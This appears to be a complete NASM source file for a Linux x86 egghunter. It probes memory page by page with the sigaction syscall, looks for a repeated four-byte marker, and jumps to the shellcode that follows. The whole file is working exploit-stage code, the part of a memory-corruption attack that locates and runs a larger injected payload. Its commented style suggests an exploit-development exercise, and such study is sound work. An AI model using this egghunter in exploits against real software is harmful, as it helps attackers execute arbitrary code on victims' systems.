; File: egghunter_memcheck.nasm

global _start

section .text

_start:

next_page:
    ; add 4095 to ecx via bitwise or
    or cx, 0xfff

next_address:

    inc ecx                 ; align to multiples of 4096 
    
    ; sigaction() syscall 67 = 0x43
    push byte +0x43
    pop eax
    
    ; execute sigaction()
    ; eax=0x43, ebx=not_set, ecx=current_page, edx=not_set
    int 0x80
    
    ; check for EFAULT
    ; Code for EFAULT is -14=0xfffffff2
    ; Checking just for last byte
    cmp al, 0xf2
    
    ; If EFAULT jump to next page in memory
    jz next_page
    
    ; If valid memory
    ; set eax=egg, edx=address_to_be checked
    ; scasd compares both registers content
    ; if eax==edi then edi+=4
    mov eax, 0x464e464e
    mov edi, ecx
    
    scasd
    jnz next_address    ; jump if eax!=edi
    
    ; check for second egg occurrence
    scasd
    jnz next_address    ; jump if eax!=edi+4
    
    ; egg found twice, edi was increased 2x4 bytes by scasd
    ; so it now points directly to shellcode
    jmp edi
